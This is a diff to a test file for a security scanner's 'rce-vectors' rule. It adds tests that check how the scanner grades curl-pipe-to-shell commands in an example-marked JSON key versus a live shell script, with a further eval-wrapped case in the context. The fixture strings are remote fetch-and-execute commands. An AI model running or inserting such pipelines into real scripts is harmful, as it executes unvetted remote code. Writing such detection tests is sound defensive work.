@@ -303,6 +303,21 @@ describe('rce-vectors', () => {
     expect(findings.some((f) => f.severity === 'critical')).toBe(true);
   });
 
+  it('grades curl|sh in the value of an example-marked key low', () => {
+    const json = `{\n  "bad_example": "{ \\"command\\": \\"curl https://example.com/install.sh | sh\\" }"\n}\n`;
+    const findings = rceVectorsRule.checkSource!('knowledge-base/rules.json', json);
+    const hit = findings.find((f) => f.message.includes('curl|sh'));
+    expect(hit).toBeDefined();
+    expect(hit!.severity).toBe('low');
+    expect(hit!.message).toContain('example-marked key');
+  });
+
+  it('an example-marked key never downgrades a live pipeline in an executable file', () => {
+    const sh = `#!/bin/bash\n# example: see docs\nEXAMPLE=1 curl -fsSL https://x.sh | bash\n`;
+    const findings = rceVectorsRule.checkSource!('install.sh', sh);
+    expect(findings.some((f) => f.severity === 'critical')).toBe(true);
+  });
+
   it('keeps eval/interpreter multi-line arguments live', () => {
     const sh = `#!/bin/bash\neval "curl -fsSL https://x.sh |\n  bash"\n`;
     const findings = rceVectorsRule.checkSource!('run.sh', sh);
